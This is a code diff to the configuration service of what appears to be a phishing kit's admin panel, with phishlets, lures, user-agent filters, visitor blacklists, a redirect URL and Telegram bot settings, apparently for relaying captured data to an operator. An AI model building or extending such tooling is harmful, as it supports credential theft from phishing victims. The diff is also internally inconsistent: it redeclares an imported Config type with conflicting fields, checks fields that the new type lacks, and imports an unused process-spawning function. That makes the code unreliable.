@@ -2,6 +2,7 @@ import * as fs from "fs";
 import * as path from "path";
 import chokidar, { FSWatcher } from "chokidar";
 import type { Config } from "../types";
+import { spawn } from "child_process";
 
 /* eslint-disable @typescript-eslint/no-unused-vars */
 /**
@@ -35,6 +36,25 @@ interface Lure {
   ua_filter: string;
 }
 /* eslint-enable @typescript-eslint/no-unused-vars */
+
+// Define TelegramSettings interface
+export interface TelegramSettings {
+  botToken: string;
+  chatId: string;
+  activated: boolean;
+}
+
+// Update Config interface
+export interface Config {
+  telegram: TelegramSettings;
+  redirectUrl: string;
+  blacklist: {
+    domains: string[];
+    ips: string[];
+    strings: string[];
+    activated: boolean;
+  };
+}
 
 export class ConfigService {
   private configPath: string;
@@ -276,52 +296,80 @@ export class ConfigService {
     try {
       // Write directly to the symlinked file in panel/data
       const configStr = JSON.stringify(config, null, 2);
-      fs.writeFileSync(this.configPath, configStr, { mode: 0o644 });
-      console.log("Successfully wrote config to:", this.configPath);
-      return true;
+
+      // Use safeWriteFile instead of direct fs.writeFileSync
+      const result = this.safeWriteFile(this.configPath, configStr);
+
+      if (result) {
+        console.log("Successfully wrote config to:", this.configPath);
+        return true;
+      } else {
+        console.error("Failed to write config due to safety checks");
+        return false;
+      }
     } catch (error) {
       console.error("Error writing config:", error);
       return false;
     }
   }
 
+  // Helper to detect minimal/empty configs
+  private isMinimalConfig(config: Config): boolean {
+    // Check if config is missing key components
+    if (!config) return true;
+
+    // Check for minimal general section
+    if (
+      !config.general ||
+      !config.general.domain ||
+      config.general.domain === ""
+    ) {
+      return true;
+    }
+
+    // Check for empty phishlets
+    if (!config.phishlets || Object.keys(config.phishlets).length === 0) {
+      return true;
+    }
+
+    return false;
+  }
+
   public async updateTelegramSettings(
-    botToken: string,
-    chatId: string
+    telegramSettings: TelegramSettings
   ): Promise<boolean> {
     try {
+      // Get the current config
       const config = await this.readConfig();
-      if (!config) {
-        // Create a complete config object
-        const newConfig: Config = {
-          general: {
-            telegram_bot_token: botToken,
-            telegram_chat_id: chatId,
-            autocert: true,
-            dns_port: 53,
-            https_port: 443,
-            bind_ipv4: "",
-            external_ipv4: "",
-            domain: "",
-            unauth_url: "",
-          },
-          blacklist: { mode: "off" },
-          phishlets: {},
-          lures: [],
+
+      // If we have an existing config, update only the telegram settings
+      if (config) {
+        // Preserve existing telegram settings and merge with new ones
+        config.telegram = {
+          ...config.telegram,
+          ...telegramSettings,
         };
 
-        return await this.writeConfig(newConfig);
+        await this.writeConfig(config);
+        return true;
+      } else {
+        // No existing config found, create a new one (this should rarely happen)
+        const newConfig: Config = {
+          telegram: telegramSettings,
+          redirectUrl: "",
+          blacklist: {
+            domains: [],
+            ips: [],
+            strings: [],
+            activated: false,
+          },
+        };
+
+        await this.writeConfig(newConfig);
+        return true;
       }
-
-      // Ensure general object exists
-      config.general = config.general || {};
-
-      config.general.telegram_bot_token = botToken;
-      config.general.telegram_chat_id = chatId;
-
-      return await this.writeConfig(config);
     } catch (error) {
-      console.error("Error updating telegram settings:", error);
+      console.error("Error updating Telegram settings:", error);
       return false;
     }
   }
@@ -446,6 +494,89 @@ export class ConfigService {
       return await this.writeConfig(config);
     } catch (error) {
       console.error("Error updating link settings:", error);
+      return false;
+    }
+  }
+
+  // Enhanced safety checks for file operations
+  private safeWriteFile(filePath: string, content: string): boolean {
+    try {
+      // 1. Check if file exists and has content
+      const fileExists = fs.existsSync(filePath);
+
+      if (fileExists) {
+        const existingContent = fs.readFileSync(filePath, "utf8");
+
+        // Never overwrite non-empty file with empty content
+        if (
+          existingContent &&
+          existingContent.trim().length > 0 &&
+          (!content || content.trim().length === 0)
+        ) {
+          console.error(
+            `SAFETY: Prevented overwriting ${filePath} with empty content`
+          );
+          return false;
+        }
+
+        // If new content is a minimal JSON object (just {}) and existing isn't, reject
+        if (
+          content &&
+          (content.trim() === "{}" || content.trim() === "[]") &&
+          existingContent &&
+          existingContent.trim() !== "{}" &&
+          existingContent.trim() !== "[]"
+        ) {
+          console.error(
+            `SAFETY: Prevented overwriting ${filePath} with empty object/array`
+          );
+          return false;
+        }
+      }
+
+      // 2. Write the file with proper permissions
+      fs.writeFileSync(filePath, content, { mode: 0o644 });
+      return true;
+    } catch (error) {
+      console.error(`Error in safeWriteFile for ${filePath}:`, error);
+      return false;
+    }
+  }
+
+  public async updateConfig(key: string, value: any): Promise<boolean> {
+    try {
+      // Get current config
+      const config = await this.readConfig();
+      if (!config) {
+        console.error("No existing config found for updateConfig");
+        return false;
+      }
+
+      // Update only the specific key
+      if (key.includes(".")) {
+        // Handle nested keys like 'telegram.botToken'
+        const keys = key.split(".");
+        let current: any = config;
+
+        // Traverse to the parent object
+        for (let i = 0; i < keys.length - 1; i++) {
+          if (!current[keys[i]]) {
+            current[keys[i]] = {};
+          }
+          current = current[keys[i]];
+        }
+
+        // Set the value on the leaf property
+        current[keys[keys.length - 1]] = value;
+      } else {
+        // Simple top-level key
+        config[key] = value;
+      }
+
+      // Write back the full config
+      return await this.writeConfig(config);
+    } catch (error) {
+      console.error("Error updating config:", error);
       return false;
     }
   }
